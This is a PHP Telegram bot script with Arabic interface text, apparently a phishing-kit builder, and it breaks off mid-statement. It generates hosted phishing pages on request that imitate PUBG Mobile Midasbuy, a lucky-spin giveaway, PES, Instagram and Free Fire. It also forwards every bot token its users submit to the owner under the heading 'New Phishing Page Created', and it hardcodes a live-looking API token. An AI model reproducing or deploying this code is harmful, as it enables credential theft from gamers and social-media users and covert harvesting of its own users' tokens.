<?php
$SPAM = "1704681214:AAEHFDGzDhdjuBgQkvA78nrnFfW_4O0MZLg";
define('API_KEY',"$SPAM");
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$text = $message->text; 
$data = $update->callback_query->data; 
$user = $update->message->from->username; 
$user2 = $update->callback_query->from->username;
$message_id = $message->message_id;
$message_id2 = $update->callback_query->message->message_id; 
$chat_id = $message->chat->id; 
$chat_id2 = $update->callback_query->message->chat->id; 
$from_id = $message->from->id;
$from_id2 = $update->callback_query->message->from->id; 
$type = $update->message->chat->type; 
$name = $message->from->first_name.$message->from->last_name;

#مسار الاندكسات#
$midasbuy = ("midasbuy.zip"); #مسار اندكس الشدات
$spin = ("midasbuy.zip"); #مسار اندكس عجلة الحظ
$pes = ("midasbuy.zip"); #مسار اندكس بيس
$insta = ("midasbuy.zip"); #مسار اندكس الانستا
$freefire = ("midasbuy.zip"); #مسار اندكس فري فاير

#صور الاندكسات#
$midasbuyphoto = ("https://t.me/DDH_I/78"); #صورة اندكس الشدات
$spinphoto = ("https://t.me/DDH_I/78"); #صورة اندكس عجبة الحظ
$pesphoto = ("https://t.me/DDH_I/78"); #صورة اندكس بيس
$instaphoto = ("https://t.me/DDH_I/78"); #صورة اندكس الانستا
$freefirephoto = ("https://t.me/DDH_I/78"); #صورة اندكس فري فاير
$link = "Website Link"; #رابط الاستضافة

#التخزين#
mkdir("database-links");
mkdir("indexdata");
$sudo = 644485636; #ايدي صاحب البوت

#الاشتراك الاجباري#
$fox_iq = "Z3ZZZZ3"; #معرف القناة بدون @
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$fox_iq&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"👋 • مرحباً بك عزيزي $name ، 🖤
🚫 • عذراً ولاكن لايمكنك استخدام البوت ، ♨️
🚸 • اشترك في قناة البوت ثم ارسل /Verify ، 🛠️
🧸 • قناة البوت @$fox_iq ، 🖇️
",'reply_to_message_id'=>$message->message_id,
]);return false;}

if($text == "/start"  or $text == "/Verify" or $text == "🔙" or $text == "🏕️ • آندكَسات ، 🏝️"){
#تخزين الداتا - يرجى عدم العبث بالكود#
file_put_contents("data/$from_id","$from_id-Real ID = ✅");
#تخزين الداتا - يرجى عدم العبث بالكود#
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/73",
'caption'=>
"🎪 ، اهلآ بك عزيزي $name , 👋

🏝️ ، هذا البوت يقوم بصنع اندكسات V I P مجاناً , 🤯

🧭 ، قم بالتنقل عبر الازرار بالاسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'⚠️ • انشاء اندكس , 🎯',],['text'=>'📛 • حذف اندكس , 🪐',]],
[['text'=>'🖇️ • آندكسآآتي , 🏝️',]],[['text'=>'🎋 • خدمات الترويج , 🎠',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$from_id");
}
if($text == '⚠️ • انشاء اندكس , 🎯' or $text == "ʙᴀᴄᴋ , 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🧭 • اهلآ بك عزيزي $name , 👋
🎪 • هذا القسم خاص بأنشاء الاندكسات , 〽️
🪐 • قم بأختيار الاندكس ليقوم البوت بصنعة , 🎯
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'👾 • ببجي موبايل , 🎯',],['text'=>'🎪 • بيس موبايل , ⚽',]],
[['text'=>'🏝️ • انستقرام , 🧸',],['text'=>'🎡 • فري فاير , 🀄',]],
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '📛 • حذف اندكس , 🪐' or $text == "• Back 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • اهلآ بك عزيزي $name , 👋
⚠️ • هذا القسم خاص بحذف الاندكسات ، 📛
🚸 • قم بأختيار الاندكسات التي تريد حذفها من الكيبورد في الاسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • ببجي موبايل ، 🏝️',],['text'=>'⚽ • بيس موبايل ، 🎪',]],
[['text'=>'🎋 • انستقرام ، 🪐',],['text'=>'🎯 • فري فاير ، 🪔',]],
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == "🎠 • ببجي موبايل ، 🏝️" or $text == "• Back 🔙"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • اهلآ بك عزيزي $name , 👋
🎠 • قم بآختيار نوع الاندكس بالاسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • شدات ، 💸',],['text'=>'🎡 • عجلة حظ ، 🧨',]],
[['text'=>'• Back 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == '🖇️ • آندكسآآتي , 🏝️' or $text == "• رجوع ، 🔙"){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • اهلا بك عزيزي $name , 👋
🎯 • قم بأختيار نوع الاندكس لتحصل علي الرابط , ⚠️
🎪 • قم بآستخدام الكيبورد في الاسفل , 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🪐 • ببجي موبايل ، 👾',],['text'=>'⚽ • بيس موبايل ، 🪔',]],
[['text'=>'🎪 • انستقرام ، 🏹',],['text'=>'🏝️ • فري فاير ، 🎠',]],
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == "🪐 • ببجي موبايل ، 👾" or $text == "• رجوع 🔙"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • اهلآ بك عزيزي $name , 👋
🎠 • قم بآختيار نوع الاندكس بالاسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'💸 • شدات , 🏝️',],['text'=>'🎡 • عجلة حظ , 🀄',]],
[['text'=>'• رجوع ، 🔙',]],
],'resize_keyboard'=>true,
])
]);
}

if($text == "👾 • ببجي موبايل , 🎯" or $text == "ʙᴀᴄᴋ 🔙"){
file_put_contents("data/$from_id","$from_id-Real ID = $database");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"👋 • اهلآ بك عزيزي $name , 🏹
👾 • هذا القسم خاص بأنشاء اندكسات ببجي موبايل , 🪐
🏝️ • قم بأختيار نوع الاندكس من الكيبورد في الاسفل , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎪 • شدات , 🪔',],['text'=>'🎡 • عجلة حظ , 🎠',]],
[['text'=>'ʙᴀᴄᴋ , 🔙',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$from_id");
}
$makeSpin = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeSpin == "spin"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | عذرا التوكن غير صحيح ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-spin");
mkdir("pubg");
mkdir("pubg/$from_id");
mkdir("pubg/$from_id/s");
mkdir("database-links/$from_id");
file_put_contents("pubg/$from_id/s/token","$text");
file_put_contents("pubg/$from_id/s/id","$chat_id");
file_put_contents("database-links/$from_id/spin","link-spin-done");
$zip = new ZipArchive;
if ($zip->open("$spin") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$from_id/s");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم صنع الاندكس بنجاح ، 🪔
🎪 • معرف البوت الخاص بك ، 🀄
@$userr
🖇️ • رابط الاندكس الخاص بك ، 👇
$link/pubg/$from_id/s/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | New Phishing Page Created ، 💙
👾 | معرف الشخص - @$user
🚸 | ايدي الشخص - $from_id
🤖 | معرف البوت - @$userr
⚠️ | توكن البوت - 👇
$text
🧛 | Bot Devloper - ᴅᴇᴠʀᴏʟᴇx 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeMidasBuy = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeMidasBuy == "midasbuy"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | عذرا التوكن غير صحيح ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-midasbuy");
mkdir("pubg");
mkdir("pubg/$from_id");
mkdir("pubg/$from_id/m");
mkdir("database-links/$from_id");
file_put_contents("pubg/$from_id/m/token","$text");
file_put_contents("pubg/$from_id/m/id","$chat_id");
file_put_contents("database-links/$from_id/midasbuy","link-midasbuy-done");
$zip = new ZipArchive;
if ($zip->open("$midasbuy") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$from_id/m");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم صنع الاندكس بنجاح ، 🪔
🎪 • معرف البوت الخاص بك ، 🀄
@$userr
🖇️ • رابط الاندكس الخاص بك ، 👇
$link/pubg/$from_id/m/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | New Phishing Page Created ، 💙
👾 | معرف الشخص - @$user
🚸 | ايدي الشخص - $from_id
🤖 | معرف البوت - @$userr
⚠️ | توكن البوت - 👇
$text
🧛 | Bot Devloper - ᴅᴇᴠʀᴏʟᴇx 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makePes = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makePes == "pes"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | عذرا التوكن غير صحيح ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-pes");
mkdir("pes");
mkdir("pes/$from_id");
mkdir("database-links/$from_id");
file_put_contents("pes/$from_id/token","$text");
file_put_contents("pes/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/pes","link-pes-done");
$zip = new ZipArchive;
if ($zip->open("$pes") === TRUE) {
    $zip->extractTo(__DIR__."/"."pes/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم صنع الاندكس بنجاح ، 🪔
🎪 • معرف البوت الخاص بك ، 🀄
@$userr
🖇️ • رابط الاندكس الخاص بك ، 👇
$link/pes/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | New Phishing Page Created ، 💙
👾 | معرف الشخص - @$user
🚸 | ايدي الشخص - $from_id
🤖 | معرف البوت - @$userr
⚠️ | توكن البوت - 👇
$text
🧛 | Bot Devloper - ᴅᴇᴠʀᴏʟᴇx 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeFreeFire = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeINsta == "freefire"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | عذرا التوكن غير صحيح ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-freefire");
mkdir("freefire");
mkdir("freefire/$from_id");
mkdir("database-links/$from_id");
file_put_contents("freefire/$from_id/token","$text");
file_put_contents("freefire/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/freefire","link-freefire-done");
$zip = new ZipArchive;
if ($zip->open("$freefire") === TRUE) {
    $zip->extractTo(__DIR__."/"."freefire/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم صنع الاندكس بنجاح ، 🪔
🎪 • معرف البوت الخاص بك ، 🀄
@$userr
🖇️ • رابط الاندكس الخاص بك ، 👇
$link/freefire/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | New Phishing Page Created ، 💙
👾 | معرف الشخص - @$user
🚸 | ايدي الشخص - $from_id
🤖 | معرف البوت - @$userr
⚠️ | توكن البوت - 👇
$text
🧛 | Bot Devloper - ᴅᴇᴠʀᴏʟᴇx 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeINsta = file_get_contents("indexdata/$from_id");
if($text != "/start" and $makeINsta == "insta"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | عذرا التوكن غير صحيح ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$from_id", "del-insta");
mkdir("insta");
mkdir("insta/$from_id");
mkdir("database-links/$from_id");
file_put_contents("insta/$from_id/token","$text");
file_put_contents("insta/$from_id/id","$chat_id");
file_put_contents("database-links/$from_id/insta","link-insta-done");
$zip = new ZipArchive;
if ($zip->open("$insta") === TRUE) {
    $zip->extractTo(__DIR__."/"."insta/$from_id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم صنع الاندكس بنجاح ، 🪔
🎪 • معرف البوت الخاص بك ، 🀄
@$userr
🖇️ • رابط الاندكس الخاص بك ، 👇
$link/insta/$from_id/index.php
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | New Phishing Page Created ، 💙
👾 | معرف الشخص - @$user
🚸 | ايدي الشخص - $from_id
🤖 | معرف البوت - @$userr
⚠️ | توكن البوت - 👇
$text
🧛 | Bot Devloper - ᴅᴇᴠʀᴏʟᴇx 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

if($text == '🎪 • شدات , 🪔' and !file_exists("pubg/$from_id/m/index.php")){ 
file_put_contents("indexdata/$from_id", "midasbuy");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midasbuyphoto",
'caption'=>
"🏝️ , اهلآ عزيزي $name ، 🎠

⚠️ , قم بأرسال التوكن الخاص بك و سيتم صنع الاندكس ، 🚸

♨️ , لألغاء الصنع اضغط علي الزر فالآسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎪 • شدات , 🪔' and file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • عذراً عزيزي لايمكنك صنع اكتر من اندكس ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • عجلة حظ , 🎠' and !file_exists("pubg/$from_id/s/index.php")){ 
file_put_contents("indexdata/$from_id", "spin");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$spinphoto",
'caption'=>
"🏝️ , اهلآ عزيزي $name ، 🎠

⚠️ , قم بأرسال التوكن الخاص بك و سيتم صنع الاندكس ، 🚸

♨️ , لألغاء الصنع اضغط علي الزر فالآسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • عجلة حظ , 🎠' and file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • عذراً عزيزي لايمكنك صنع اكتر من اندكس ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎪 • بيس موبايل , ⚽' and !file_exists("pes/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "pes");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$pesphoto",
'caption'=>
"🏝️ , اهلآ عزيزي $name ، 🎠

⚠️ , قم بأرسال التوكن الخاص بك و سيتم صنع الاندكس ، 🚸

♨️ , لألغاء الصنع اضغط علي الزر فالآسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎪 • بيس موبايل , ⚽' and file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • عذراً عزيزي لايمكنك صنع اكتر من اندكس ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • انستقرام , 🧸' and !file_exists("insta/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "insta");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$instaphoto",
'caption'=>
"🏝️ , اهلآ عزيزي $name ، 🎠

⚠️ , قم بأرسال التوكن الخاص بك و سيتم صنع الاندكس ، 🚸

♨️ , لألغاء الصنع اضغط علي الزر فالآسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • انستقرام , 🧸' and file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • عذراً عزيزي لايمكنك صنع اكتر من اندكس ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • فري فاير , 🀄' and !file_exists("freefire/$from_id/index.php")){ 
file_put_contents("indexdata/$from_id", "freefire");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$freefirephoto",
'caption'=>
"🏝️ , اهلآ عزيزي $name ، 🎠

⚠️ , قم بأرسال التوكن الخاص بك و سيتم صنع الاندكس ، 🚸

♨️ , لألغاء الصنع اضغط علي الزر فالآسفل ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • فري فاير , 🀄' and file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • عذراً عزيزي لايمكنك صنع اكتر من اندكس ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

$link_midasbuy = file_get_contents("database-links/$from_id/midasbuy");
if($text == '💸 • شدات , 🏝️' and $link_midasbuy == "link-midasbuy-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
🖇️ • الرابط الخاص بك ~ 👇
$link/pubg/$from_id/m/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '💸 • شدات , 🏝️' and !file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع 🔙',]]
],'resize_keyboard'=>true])]);}

$link_spin = file_get_contents("database-links/$from_id/spin");
if($text == '🎡 • عجلة حظ , 🀄' and $link_spin == "link-spin-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
🖇️ • الرابط الخاص بك ~ 👇
$link/pubg/$from_id/s/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • عجلة حظ , 🀄' and !file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع 🔙',]]
],'resize_keyboard'=>true])]);}

$link_pes = file_get_contents("database-links/$from_id/pes");
if($text == '⚽ • بيس موبايل ، 🪔' and $link_pes == "link-pes-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
🖇️ • الرابط الخاص بك ~ 👇
$link/pes/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '⚽ • بيس موبايل ، 🪔' and !file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

$link_insta = file_get_contents("database-links/$from_id/insta");
if($text == '🎪 • انستقرام ، 🏹' and $link_insta == "link-insta-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
🖇️ • الرابط الخاص بك ~ 👇
$link/insta/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎪 • انستقرام ، 🏹' and !file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

$link_freefire = file_get_contents("database-links/$from_id/freefire");
if($text == '🏝️ • فري فاير ، 🎠' and $link_freefire == "link-freefire-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
🖇️ • الرابط الخاص بك ~ 👇
$link/freefire/$from_id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🏝️ • فري فاير ، 🎠' and !file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'• رجوع ، 🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎠 • شدات ، 💸' and !file_exists("pubg/$from_id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎠 • شدات ، 💸' and file_exists("pubg/$from_id/m/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$from_id/m/*")));
unlink("database-links/$from_id/midasbuy");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • تم حذف الاندكس بنجاح ✅
⁉️ • كود المعاملة - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎡 • عجلة حظ ، 🧨' and !file_exists("pubg/$from_id/s/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎡 • عجلة حظ ، 🧨' and file_exists("pubg/$from_id/s/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$from_id/s/*")));
unlink("database-links/$from_id/spin");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • تم حذف الاندكس بنجاح ✅
⁉️ • كود المعاملة - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎯 • فري فاير ، 🪔' and !file_exists("freefire/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎯 • فري فاير ، 🪔' and file_exists("freefire/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("freefire/$from_id/*")));
unlink("database-links/$from_id/freefire");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • تم حذف الاندكس بنجاح ✅
⁉️ • كود المعاملة - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '⚽ • بيس موبايل ، 🎪' and !file_exists("pes/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '⚽ • بيس موبايل ، 🎪' and file_exists("pes/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pes/$from_id/*")));
unlink("database-links/$from_id/pes");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • تم حذف الاندكس بنجاح ✅
⁉️ • كود المعاملة - $result
",'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]],
],'resize_keyboard'=>true])]);}

if($text == '🎋 • انستقرام ، 🪐' and !file_exists("insta/$from_id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | عذراً عزيزي انت لم تقم بأنشاء اندكس ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔙',]]
],'resize_keyboard'=>true])]);}

if($text == '🎋 • انستقرام ، 🪐' and file_exists("insta/$from_id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("insta/$from_id/*")));
unlink("database-links/$from_id/insta");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • تم حذف الاندكس بنجاح ✅
